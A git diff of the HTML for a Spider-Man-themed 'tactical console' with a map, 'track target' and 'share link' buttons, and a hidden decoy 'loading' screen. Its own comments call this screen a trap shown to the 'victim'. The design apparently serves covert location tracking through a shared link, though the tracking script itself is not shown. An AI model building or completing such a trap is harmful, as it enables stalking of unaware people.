@@ -3,51 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spider-Man Tactical Interface</title>
-    <link rel="stylesheet" href="style.css">
-    <!-- Estilos de Leaflet -->
+    <title>Spidey Console</title>
+    <!-- Leaflet CSS -->
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <!-- Estilos personalizados -->
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-    <!-- Consola Normal (Tu PC) -->
-    <div class="console-container" id="main-console">
-        <div class="top-screen">
+    <!-- MODO VÍCTIMA (Pantalla de carga / sigilosa) -->
+    <div id="stealth-screen" style="display: none;">
+        <div class="loader-content">
+            <h2>Cargando recurso...</h2>
+            <p>Por favor espera un momento.</p>
+        </div>
+    </div>
+
+    <!-- MODO CONSOLA PRINCIPAL (Tu interfaz táctica) -->
+    <div id="main-console">
+        <div class="console-container">
+            <!-- Banner de estado -->
+            <div id="banner-status" class="banner">INICIALIZANDO SISTEMA...</div>
+
+            <!-- Contenedor del Mapa (Obligatorio con altura fija en CSS) -->
             <div id="map"></div>
-            
-            <div class="notification-banner" id="banner-status">
-                TACTICAL FEED<br>AWAITING SIGNAL...
+
+            <!-- Botonera de control -->
+            <div class="button-grid">
+                <button onclick="cambiarAlerta('A1')">A.1</button>
+                <button onclick="cambiarPerfil('PROF 1')">PROF 1</button>
+                <button onclick="obtenerUbicacionActual()">MY LOC</button>
+                <button onclick="abrirChat()">CHAT</button>
+                
+                <button onclick="cambiarAlerta('A2')">A.2</button>
+                <button onclick="cambiarPerfil('PROF 2')">PROF 2</button>
+                <button onclick="accionRastrearObjetivo()">RASTREAR</button>
+                <button onclick="verArchivo()">ARCHIVE</button>
+                
+                <button onclick="cambiarPerfil('PROF 3')">PROF 3</button>
+                <button onclick="centrarEnMiUbicacion()">CENTER</button>
+                <button onclick="compartirEnlace()">SHARE LINK</button>
             </div>
         </div>
-
-        <div class="bottom-panel">
-            <button class="btn btn-green" onclick="cambiarAlerta('A.1')">A.1</button>
-            <button class="btn btn-green" onclick="cambiarPerfil(1)">PROF 1</button>
-            <button class="btn btn-blue" onclick="obtenerUbicacionActual()">MY LOC</button>
-            <button class="btn" onclick="abrirChat()">CHAT</button>
-
-            <button class="btn btn-red" onclick="cambiarAlerta('A.2')">A.2</button>
-            <button class="btn btn-green" onclick="cambiarPerfil(2)">PROF 2</button>
-            <button class="btn btn-red" onclick="accionRastrearObjetivo()">RASTREAR</button>
-            <button class="btn" onclick="verArchivo()">ARCHIVE</button>
-
-            <div></div>
-            <button class="btn btn-green" onclick="cambiarPerfil(3)">PROF 3</button>
-            <button class="btn" onclick="centrarEnMiUbicacion()">CENTER</button>
-            <button class="btn" onclick="compartirEnlace()">SHARE LINK</button>
-        </div>
     </div>
 
-    <!-- Pantalla trampa sigilosa (Lo que ve la víctima por un segundo antes de que se cierre/limpie) -->
-    <div id="stealth-screen" style="display: none; background: #000; color: #0ff; height: 100vh; width: 100vw; position: fixed; top: 0; left: 0; z-index: 9999; justify-content: center; align-items: center; font-family: monospace;">
-        <div style="text-align: center;">
-            <h2>Cargando recurso...</h2>
-            <p>Por favor espere un momento.</p>
-        </div>
-    </div>
-
-    <!-- Scripts de Leaflet -->
+    <!-- Leaflet JS -->
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <script src="script.js" type="module"></script>
+    <!-- Script principal como Módulo -->
+    <script type="module" src="script.js"></script>
 </body>
 </html>
